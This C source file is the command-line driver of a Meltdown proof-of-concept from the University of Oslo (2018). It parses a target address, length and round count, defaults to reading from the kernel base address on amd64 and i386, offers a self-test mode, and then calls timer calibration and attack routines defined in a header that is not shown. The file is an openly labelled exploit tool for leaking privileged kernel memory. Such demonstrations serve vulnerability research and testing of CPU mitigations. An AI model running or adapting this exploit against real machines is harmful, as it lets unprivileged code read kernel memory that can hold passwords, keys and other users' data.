/*-
 * Copyright (c) 2018 The University of Oslo
 * Copyright (c) 2018 Dag-Erling Smørgrav
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote
 *    products derived from this software without specific prior written
 *    permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <err.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "meltdown.h"

/*
 * Kernel base address for a few platforms
 */
#if __amd64__
#define KERNBASE	0xffffffff80000000UL
#elif __i386__
#define KERNBASE	0xc0000000U
#else
#error "Unsupported architecture"
#endif

/*
 * Address and length of data to read
 */
static uint8_t *atk_addr;
static size_t atk_len;
static unsigned int atk_rounds;
#define DFLT_ATK_ADDR	((uint8_t *)KERNBASE)
#define DFLT_ATK_LEN	16
#define DFLT_ATK_ROUNDS	3

/*
 * Self-test
 */
static uint8_t selftest[4096];

/*
 * Print usage string and exit.
 */
static void
usage(void)
{

	fprintf(stderr, "usage: meltdown [-v] [-a addr | -s] [-l len] [-n rounds]\n");
	exit(1);
}

int
main(int argc, char *argv[])
{
	char *end;
	uintmax_t umax;
	unsigned int i;
	int opt;

	while ((opt = getopt(argc, argv, "a:l:n:sv")) != -1)
		switch (opt) {
		case 'a':
			if (atk_addr != 0)
				usage();
			umax = strtoull(optarg, &end, 16);
			if (end == optarg || *end != '\0')
				errx(1, "invalid address");
			atk_addr = (uint8_t *)umax;
			if ((uintmax_t)atk_addr != umax)
				errx(1, "address is out of range");
			break;
		case 'l':
			if (atk_len != 0)
				usage();
			umax = strtoull(optarg, &end, 0);
			if (end == optarg || *end != '\0')
				errx(1, "invalid length");
			atk_len = umax;
			if (atk_len == 0 || (uintmax_t)atk_len != umax)
				errx(1, "length is out of range");
			break;
		case 'n':
			if (atk_rounds != 0)
				usage();
			umax = strtoull(optarg, &end, 0);
			if (end == optarg || *end != '\0')
				errx(1, "invalid round count");
			atk_rounds = umax;
			if (atk_rounds == 0 || (uintmax_t)atk_rounds != umax)
				errx(1, "round count is out of range");
			break;
		case 's':
			if (atk_addr != 0)
				usage();
			atk_addr = selftest;
			break;
		case 'v':
			verbose++;
			break;
		default:
			usage();
		}

	argc -= optind;
	argv += optind;

	if (argc)
		usage();

	/* default address and length */
	if (atk_addr == 0)
		atk_addr = DFLT_ATK_ADDR;
	if (atk_len == 0)
		atk_len = DFLT_ATK_LEN;
	if (atk_rounds == 0)
		atk_rounds = DFLT_ATK_ROUNDS;

	/* generate self-test data if required */
	if (atk_addr == selftest) {
		for (i = 0; i < sizeof selftest; ++i)
			selftest[i] = '!' + i % ('~' - '!' + 1);
		if (atk_len > sizeof selftest)
			atk_len = sizeof selftest;
	}

	/* create the probe array and ensure that it is paged in */
	meltdown_init();

	/* calibrate our timer */
	meltdown_calibrate();

	/* perform the attack */
	meltdown_attack(atk_addr, atk_len, atk_rounds);

	exit(0);
}
